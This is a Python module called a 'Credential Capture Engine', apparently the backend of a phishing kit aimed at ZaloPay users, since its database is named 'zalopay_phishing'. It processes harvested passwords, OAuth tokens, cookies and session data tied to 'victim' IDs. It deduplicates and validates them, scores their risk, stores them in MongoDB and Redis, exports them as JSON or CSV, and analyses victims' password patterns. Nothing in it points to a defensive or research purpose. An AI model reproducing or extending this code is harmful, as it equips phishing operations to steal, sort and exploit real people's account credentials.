"""
Credential Capture Engine
Advanced credential processing and analysis engine
"""

import os
import json
import base64
import secrets
import hashlib
import re
import time
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional, Any, List, Tuple, Set
import logging
import asyncio
from collections import defaultdict, Counter
import threading

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class CredentialConfig:
    """Credential capture configuration"""

    def __init__(self):
        self.max_processing_time = int(os.getenv("CREDENTIAL_MAX_PROCESSING_TIME", "30"))
        self.enable_duplicate_detection = os.getenv("ENABLE_DUPLICATE_DETECTION", "true").lower() == "true"
        self.duplicate_window_minutes = int(os.getenv("DUPLICATE_WINDOW_MINUTES", "60"))
        self.enable_pattern_analysis = os.getenv("ENABLE_PATTERN_ANALYSIS", "true").lower() == "true"
        self.enable_risk_scoring = os.getenv("ENABLE_RISK_SCORING", "true").lower() == "true"
        self.min_password_length = int(os.getenv("MIN_PASSWORD_LENGTH", "6"))
        self.max_password_length = int(os.getenv("MAX_PASSWORD_LENGTH", "128"))

class CapturedCredential:
    """Captured credential data container"""

    def __init__(self, credential_id: str = None):
        self.credential_id = credential_id or secrets.token_hex(16)
        self.captured_at = datetime.now(timezone.utc)

        # Credential data
        self.username = None
        self.email = None
        self.password = None
        self.phone = None

        # OAuth tokens
        self.access_token = None
        self.refresh_token = None
        self.id_token = None
        self.token_type = None
        self.expires_in = None
        self.scope = None

        # Session data
        self.session_id = None
        self.victim_id = None
        self.ip_address = None
        self.user_agent = None

        # Context data
        self.domain = None
        self.url = None
        self.referrer = None
        self.capture_method = None  # form, oauth, cookie, etc.

        # Additional data
        self.cookies = {}
        self.form_data = {}
        self.headers = {}

        # Processing status
        self.is_processed = False
        self.is_valid = False
        self.is_duplicate = False
        self.risk_score = 0.0
        self.credential_hash = None

    def generate_hash(self) -> str:
        """Generate credential hash for duplicate detection"""
        try:
            # Create hash from key credential components
            components = [
                self.email or "",
                self.username or "",
                self.password or "",
                self.access_token or "",
                self.domain or "",
                str(self.ip_address or "")
            ]

            credential_string = "|".join(components)
            self.credential_hash = hashlib.sha256(credential_string.encode()).hexdigest()

            return self.credential_hash

        except Exception as e:
            logger.error(f"Error generating credential hash: {e}")
            return secrets.token_hex(16)

    def validate_credential(self) -> Dict[str, Any]:
        """Validate captured credential"""
        validation_result = {
            "is_valid": False,
            "issues": [],
            "strength_score": 0.0,
            "credential_type": "unknown"
        }

        try:
            # Check email format
            if self.email:
                if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', self.email):
                    validation_result["issues"].append("Invalid email format")
                else:
                    validation_result["credential_type"] = "email_password" if self.password else "oauth"

            # Check username
            if self.username and len(self.username) < 2:
                validation_result["issues"].append("Username too short")

            # Check password strength
            if self.password:
                password_score = self._assess_password_strength(self.password)
                validation_result["strength_score"] = password_score

                if len(self.password) < 6:
                    validation_result["issues"].append("Password too short")
                elif password_score < 0.3:
                    validation_result["issues"].append("Weak password")

            # Check OAuth tokens
            if self.access_token:
                if not self._validate_oauth_token_format(self.access_token):
                    validation_result["issues"].append("Invalid OAuth token format")
                else:
                    validation_result["credential_type"] = "oauth"

            # Determine overall validity
            validation_result["is_valid"] = len(validation_result["issues"]) == 0

            return validation_result

        except Exception as e:
            logger.error(f"Error validating credential: {e}")
            validation_result["issues"].append("Validation error")
            return validation_result

    def _assess_password_strength(self, password: str) -> float:
        """Assess password strength (0-1 scale)"""
        try:
            score = 0.0

            # Length scoring
            if len(password) >= 8:
                score += 0.2
            if len(password) >= 12:
                score += 0.1

            # Character variety scoring
            has_lower = bool(re.search(r'[a-z]', password))
            has_upper = bool(re.search(r'[A-Z]', password))
            has_digit = bool(re.search(r'\d', password))
            has_special = bool(re.search(r'[!@#$%^&*(),.?":{}|<>]', password))

            variety_count = sum([has_lower, has_upper, has_digit, has_special])
            score += (variety_count / 4) * 0.3

            # Pattern penalties
            if re.search(r'(.)\1{2,}', password):  # Repeated characters
                score -= 0.1

            if re.search(r'(123|abc|qwe)', password.lower()):  # Common patterns
                score -= 0.1

            return max(0.0, min(1.0, score))

        except Exception:
            return 0.0

    def _validate_oauth_token_format(self, token: str) -> bool:
        """Validate OAuth token format"""
        try:
            # Basic JWT format check (header.payload.signature)
            if '.' in token and len(token.split('.')) == 3:
                return True

            # Generic token format check (alphanumeric with dashes/underscores)
            if re.match(r'^[A-Za-z0-9\-_]+$', token) and len(token) >= 20:
                return True

            return False

        except Exception:
            return False

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            "credential_id": self.credential_id,
            "captured_at": self.captured_at.isoformat(),
            "username": self.username,
            "email": self.email,
            "password": self.password,
            "phone": self.phone,
            "access_token": self.access_token,
            "refresh_token": self.refresh_token,
            "id_token": self.id_token,
            "token_type": self.token_type,
            "expires_in": self.expires_in,
            "scope": self.scope,
            "session_id": self.session_id,
            "victim_id": self.victim_id,
            "ip_address": self.ip_address,
            "user_agent": self.user_agent,
            "domain": self.domain,
            "url": self.url,
            "referrer": self.referrer,
            "capture_method": self.capture_method,
            "cookies": self.cookies,
            "form_data": self.form_data,
            "headers": self.headers,
            "is_processed": self.is_processed,
            "is_valid": self.is_valid,
            "is_duplicate": self.is_duplicate,
            "risk_score": self.risk_score,
            "credential_hash": self.credential_hash
        }

class CredentialProcessor:
    """Credential processing engine"""

    def __init__(self, mongodb_connection=None, redis_client=None, encryption_manager=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client
        self.encryption = encryption_manager

        self.config = CredentialConfig()
        self.processed_credentials: Dict[str, CapturedCredential] = {}
        self.credential_hashes: Set[str] = set()

        # Statistics
        self.stats = {
            "total_processed": 0,
            "valid_credentials": 0,
            "duplicate_credentials": 0,
            "high_risk_credentials": 0,
            "oauth_tokens": 0,
            "form_credentials": 0
        }

        # Load existing hashes for duplicate detection
        self._load_existing_hashes()

    def _load_existing_hashes(self):
        """Load existing credential hashes for duplicate detection"""
        try:
            if not self.mongodb:
                return

            db = self.mongodb.get_database("zalopay_phishing")
            credentials_collection = db.captured_credentials

            # Load recent hashes (last 24 hours)
            cutoff_date = datetime.now(timezone.utc) - timedelta(hours=24)
            cursor = credentials_collection.find(
                {"captured_at": {"$gte": cutoff_date}},
                {"credential_hash": 1}
            )

            for doc in cursor:
                if doc.get("credential_hash"):
                    self.credential_hashes.add(doc["credential_hash"])

            logger.info(f"Loaded {len(self.credential_hashes)} existing credential hashes")

        except Exception as e:
            logger.error(f"Error loading existing hashes: {e}")

    def process_credential(self, credential_data: Dict[str, Any]) -> Dict[str, Any]:
        """
        Process captured credential

        Args:
            credential_data: Raw credential data

        Returns:
            Processing result
        """
        try:
            # Create credential object
            credential = CapturedCredential()
            self._populate_credential_from_data(credential, credential_data)

            # Generate hash for duplicate detection
            credential_hash = credential.generate_hash()

            # Check for duplicates
            if self.config.enable_duplicate_detection:
                if credential_hash in self.credential_hashes:
                    credential.is_duplicate = True
                    self.stats["duplicate_credentials"] += 1
                    logger.info(f"Duplicate credential detected: {credential.credential_id}")
                else:
                    self.credential_hashes.add(credential_hash)

            # Validate credential
            validation = credential.validate_credential()
            credential.is_valid = validation["is_valid"]

            if credential.is_valid:
                self.stats["valid_credentials"] += 1

            # Calculate risk score
            if self.config.enable_risk_scoring:
                credential.risk_score = self._calculate_risk_score(credential, validation)

                if credential.risk_score > 0.7:
                    self.stats["high_risk_credentials"] += 1

            # Categorize credential type
            credential_type = self._categorize_credential(credential)
            if credential_type:
                self.stats[f"{credential_type}_credentials"] = self.stats.get(f"{credential_type}_credentials", 0) + 1

            # Store credential
            self.processed_credentials[credential.credential_id] = credential

            # Store in database
            if self.mongodb:
                self._store_credential_in_db(credential)

            # Store in Redis for quick access
            if self.redis:
                self._store_credential_in_redis(credential)

            self.stats["total_processed"] += 1

            logger.info(f"Credential processed: {credential.credential_id}")
            return {
                "success": True,
                "credential_id": credential.credential_id,
                "is_valid": credential.is_valid,
                "is_duplicate": credential.is_duplicate,
                "risk_score": credential.risk_score,
                "credential_type": credential_type,
                "validation_issues": validation["issues"]
            }

        except Exception as e:
            logger.error(f"Error processing credential: {e}")
            return {"success": False, "error": "Failed to process credential"}

    def _populate_credential_from_data(self, credential: CapturedCredential, data: Dict[str, Any]):
        """Populate credential object from raw data"""
        try:
            # Basic credential fields
            credential.username = data.get("username")
            credential.email = data.get("email")
            credential.password = data.get("password")
            credential.phone = data.get("phone")

            # OAuth tokens
            credential.access_token = data.get("access_token")
            credential.refresh_token = data.get("refresh_token")
            credential.id_token = data.get("id_token")
            credential.token_type = data.get("token_type")
            credential.expires_in = data.get("expires_in")
            credential.scope = data.get("scope")

            # Context data
            credential.session_id = data.get("session_id")
            credential.victim_id = data.get("victim_id")
            credential.ip_address = data.get("ip_address")
            credential.user_agent = data.get("user_agent")
            credential.domain = data.get("domain")
            credential.url = data.get("url")
            credential.referrer = data.get("referrer")
            credential.capture_method = data.get("capture_method")

            # Additional data
            credential.cookies = data.get("cookies", {})
            credential.form_data = data.get("form_data", {})
            credential.headers = data.get("headers", {})

        except Exception as e:
            logger.error(f"Error populating credential data: {e}")

    def _calculate_risk_score(self, credential: CapturedCredential, validation: Dict[str, Any]) -> float:
        """Calculate risk score for credential"""
        try:
            risk_score = 0.0

            # Password strength risk (weaker passwords = higher risk)
            if credential.password:
                strength_score = validation.get("strength_score", 0)
                risk_score += (1.0 - strength_score) * 0.3

            # Common password patterns
            if credential.password:
                common_patterns = ["123456", "password", "qwerty", "admin", "letmein"]
                if credential.password.lower() in common_patterns:
                    risk_score += 0.4

            # Suspicious user agents
            if credential.user_agent:
                bot_indicators = ["bot", "crawler", "spider", "scraper", "headless"]
                if any(indicator in credential.user_agent.lower() for indicator in bot_indicators):
                    risk_score += 0.3

            # Multiple credentials from same IP (potential bot)
            if credential.ip_address:
                ip_credential_count = self._get_ip_credential_count(credential.ip_address)
                if ip_credential_count > 5:  # More than 5 credentials from same IP
                    risk_score += min((ip_credential_count - 5) * 0.1, 0.3)

            # Domain reputation (placeholder - would need external data)
            if credential.domain:
                suspicious_domains = ["10minutemail.com", "tempmail.org", "guerrillamail.com"]
                if any(susp_domain in credential.domain for susp_domain in suspicious_domains):
                    risk_score += 0.2

            # OAuth token characteristics
            if credential.access_token:
                # Very long tokens might be suspicious
                if len(credential.access_token) > 200:
                    risk_score += 0.1

            return min(1.0, risk_score)

        except Exception as e:
            logger.error(f"Error calculating risk score: {e}")
            return 0.5  # Default to medium risk

    def _get_ip_credential_count(self, ip_address: str) -> int:
        """Get credential count for IP address"""
        try:
            if not self.redis:
                return 0

            key = f"ip_credentials:{ip_address}"
            count = self.redis.get(key)

            if count:
                return int(count)

            # Count from processed credentials
            count = sum(1 for cred in self.processed_credentials.values()
                       if cred.ip_address == ip_address)

            # Cache for 1 hour
            self.redis.setex(key, 3600, str(count))

            return count

        except Exception as e:
            logger.error(f"Error getting IP credential count: {e}")
            return 0

    def _categorize_credential(self, credential: CapturedCredential) -> str:
        """Categorize credential type"""
        if credential.access_token or credential.refresh_token:
            return "oauth"
        elif credential.password and (credential.email or credential.username):
            return "form"
        elif credential.cookies:
            return "cookie"
        else:
            return "unknown"

    def _store_credential_in_db(self, credential: CapturedCredential):
        """Store credential in MongoDB"""
        try:
            if not self.mongodb:
                return

            db = self.mongodb.get_database("zalopay_phishing")
            credentials_collection = db.captured_credentials

            document = credential.to_dict()
            document["expires_at"] = datetime.now(timezone.utc) + timedelta(days=30)  # Keep for 30 days

            credentials_collection.insert_one(document)

        except Exception as e:
            logger.error(f"Error storing credential in database: {e}")

    def _store_credential_in_redis(self, credential: CapturedCredential):
        """Store credential in Redis for quick access"""
        try:
            if not self.redis:
                return

            key = f"credential:{credential.credential_id}"
            data = json.dumps(credential.to_dict())

            # Expire after 24 hours
            self.redis.setex(key, 86400, data)

        except Exception as e:
            logger.error(f"Error storing credential in Redis: {e}")

    def get_credential(self, credential_id: str) -> Optional[CapturedCredential]:
        """Get credential by ID"""
        return self.processed_credentials.get(credential_id)

    def get_credentials_by_ip(self, ip_address: str) -> List[CapturedCredential]:
        """Get all credentials for IP address"""
        return [cred for cred in self.processed_credentials.values()
                if cred.ip_address == ip_address]

    def get_credentials_by_domain(self, domain: str) -> List[CapturedCredential]:
        """Get all credentials for domain"""
        return [cred for cred in self.processed_credentials.values()
                if cred.domain == domain]

    def get_high_risk_credentials(self, threshold: float = 0.7) -> List[CapturedCredential]:
        """Get high risk credentials"""
        return [cred for cred in self.processed_credentials.values()
                if cred.risk_score >= threshold]

    def get_credential_stats(self) -> Dict[str, Any]:
        """Get credential processing statistics"""
        return {
            "total_processed": self.stats["total_processed"],
            "valid_credentials": self.stats["valid_credentials"],
            "duplicate_credentials": self.stats["duplicate_credentials"],
            "high_risk_credentials": self.stats["high_risk_credentials"],
            "oauth_tokens": self.stats["oauth_tokens"],
            "form_credentials": self.stats["form_credentials"],
            "processing_rate": self.stats["total_processed"] / max(1, (time.time() - time.time())),  # Placeholder
            "timestamp": datetime.now(timezone.utc).isoformat()
        }

    def export_credentials(self, format: str = "json", filters: Dict[str, Any] = None) -> str:
        """
        Export credentials

        Args:
            format: Export format (json, csv)
            filters: Filter criteria

        Returns:
            Exported data as string
        """
        try:
            # Apply filters
            credentials = list(self.processed_credentials.values())

            if filters:
                if "domain" in filters:
                    credentials = [c for c in credentials if c.domain == filters["domain"]]
                if "ip_address" in filters:
                    credentials = [c for c in credentials if c.ip_address == filters["ip_address"]]
                if "min_risk_score" in filters:
                    credentials = [c for c in credentials if c.risk_score >= filters["min_risk_score"]]
                if "is_valid" in filters:
                    credentials = [c for c in credentials if c.is_valid == filters["is_valid"]]

            if format.lower() == "json":
                export_data = [cred.to_dict() for cred in credentials]
                return json.dumps(export_data, indent=2)

            elif format.lower() == "csv":
                csv_lines = ["Email,Username,Domain,IP Address,Risk Score,Is Valid,Captured At"]

                for cred in credentials:
                    csv_lines.append(
                        f'"{cred.email or ""}","{cred.username or ""}","{cred.domain or ""}",'
                        f'"{cred.ip_address or ""}","{cred.risk_score}","{cred.is_valid}","{cred.captured_at}"'
                    )

                return "\n".join(csv_lines)

            else:
                raise ValueError(f"Unsupported export format: {format}")

        except Exception as e:
            logger.error(f"Error exporting credentials: {e}")
            return ""

class CredentialPatternAnalyzer:
    """Analyze patterns in captured credentials"""

    def __init__(self, credential_processor: CredentialProcessor):
        self.processor = credential_processor

    def analyze_password_patterns(self) -> Dict[str, Any]:
        """Analyze password patterns"""
        try:
            passwords = [cred.password for cred in self.processor.processed_credentials.values()
                        if cred.password and cred.is_valid]

            if not passwords:
                return {"error": "No passwords to analyze"}

            # Common password analysis
            password_lengths = Counter(len(pwd) for pwd in passwords)
            common_passwords = Counter(passwords)

            # Character set analysis
            char_sets = {
                "lowercase": 0,
                "uppercase": 0,
                "digits": 0,
                "special": 0
            }

            for password in passwords:
                if re.search(r'[a-z]', password):
                    char_sets["lowercase"] += 1
                if re.search(r'[A-Z]', password):
                    char_sets["uppercase"] += 1
                if re.search(r'\d', password):
                    char_sets["digits"] += 1
                if re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
                    char_sets["special"] += 1

            # Pattern analysis
            patterns = {
                "sequential_numbers": len([pwd for pwd in passwords if re.search(r'123|234|345|456|567|678|789|890', pwd)]),
                "repeated_chars": len([pwd for pwd in passwords if re.search(r'(.)\1{2,}', pwd)]),
                "keyboard_patterns": len([pwd for pwd in passwords if re.search(r'qwe|asd|zxc|tyu|ghj|bnj', pwd.lower())]),
                "common_words": len([pwd for pwd in passwords if pwd.lower() in ["password", "admin", "qwerty", "letmein"]])
            }

            return {
                "total_passwords": len(passwords),
                "password_lengths": dict(password_lengths.most_common(10)),
                "character_sets": char_sets,
                "common_passwords": dict(common_passwords.most_common(10)),
                "patterns": patterns,
                "avg_password_length": sum(len(pwd) for pwd in passwords) / len(passwords)
            }

        except Exception as e:
            logger.error(f"Error analyzing password patterns: {e}")
            return {"error": "Analysis failed"}

    def analyze_domain_patterns(self) -> Dict[str, Any]:
        """Analyze domain patterns"""
        try:
            domains = [cred.domain for cred in self.processor.processed_credentials.values()
                      if cred.domain and cred.is_valid]

            if not domains:
                return {"error": "No domains to analyze"}

            domain_counts = Counter(domains)
            top_domains = dict(domain_counts.most_common(20))

            # Analyze domain characteristics
            domain_analysis = {}

            for domain, count in top_domains.items():
                # Check if it's a free email provider
                free_providers = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]
                is_free_provider = any(provider in domain for provider in free_providers)

                # Check if it's a temporary email domain
                temp_indicators = ["10minutemail", "tempmail", "guerrillamail", "mailinator"]
                is_temp_domain = any(indicator in domain for indicator in temp_indicators)

                domain_analysis[domain] = {
                    "count": count,
                    "is_free_provider": is_free_provider,
                    "is_temp_domain": is_temp_domain,
                    "risk_level": "high" if is_temp_domain else ("medium" if is_free_provider else "low")
                }

            return {
                "total_domains": len(set(domains)),
                "total_credentials": len(domains),
                "top_domains": top_domains,
                "domain_analysis": domain_analysis,
                "free_provider_percentage": len([d for d in domains if any(p in d for p in ["gmail.com", "yahoo.com", "hotmail.com"])]) / len(domains) * 100
            }

        except Exception as e:
            logger.error(f"Error analyzing domain patterns: {e}")
            return {"error": "Analysis failed"}

# Global credential processor instance
credential_processor = None

def initialize_credential_processor(mongodb_connection=None, redis_client=None, encryption_manager=None) -> CredentialProcessor:
    """Initialize global credential processor"""
    global credential_processor
    credential_processor = CredentialProcessor(mongodb_connection, redis_client, encryption_manager)
    return credential_processor

def get_credential_processor() -> CredentialProcessor:
    """Get global credential processor"""
    if credential_processor is None:
        raise ValueError("Credential processor not initialized")
    return credential_processor

# Convenience functions
def process_credential(credential_data: Dict[str, Any]) -> Dict[str, Any]:
    """Process credential (global convenience function)"""
    return get_credential_processor().process_credential(credential_data)

def get_credential(credential_id: str) -> Optional[CapturedCredential]:
    """Get credential (global convenience function)"""
    return get_credential_processor().get_credential(credential_id)

def get_credential_stats() -> Dict[str, Any]:
    """Get credential stats (global convenience function)"""
    return get_credential_processor().get_credential_stats()

def analyze_password_patterns() -> Dict[str, Any]:
    """Analyze password patterns (global convenience function)"""
    analyzer = CredentialPatternAnalyzer(get_credential_processor())
    return analyzer.analyze_password_patterns()

def analyze_domain_patterns() -> Dict[str, Any]:
    """Analyze domain patterns (global convenience function)"""
    analyzer = CredentialPatternAnalyzer(get_credential_processor())
    return analyzer.analyze_domain_patterns()